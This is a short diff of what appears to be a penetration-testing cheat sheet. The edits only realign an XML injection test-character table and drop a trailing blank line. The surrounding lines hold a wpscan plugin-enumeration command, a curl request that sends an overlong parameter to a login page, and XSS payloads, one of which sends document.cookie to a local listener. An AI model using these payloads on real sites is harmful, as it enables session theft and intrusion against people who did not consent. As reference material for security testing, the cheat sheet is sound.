@@ -139,12 +139,12 @@ wpscan.rb - -url www.target.com - -enumerate p
 
 # XML Injection
 
-Single quote		foo'
-Double quote		foo”
-Greater than		foo>
-Less than           foo<			
-Comment tag		foo<!--
-Ampersand           &foo
+Single quote         foo'
+Double quote         foo”
+Greater than         foo>
+Less than            foo<			
+Comment tag          foo<!--
+Ampersand            &foo
 ------------------------------------------------------------------------------------------------------
 
 # XSS
@@ -158,4 +158,3 @@ curl https://target.com/login.php?user=`perl –e 'print "a" x 500'`
 
 <script>alert(document.cookie)</script>
 <script>var img = new Image(); img.src=“http://127.0.0.1:8000/?cookie=“+document.cookie;</script>
-
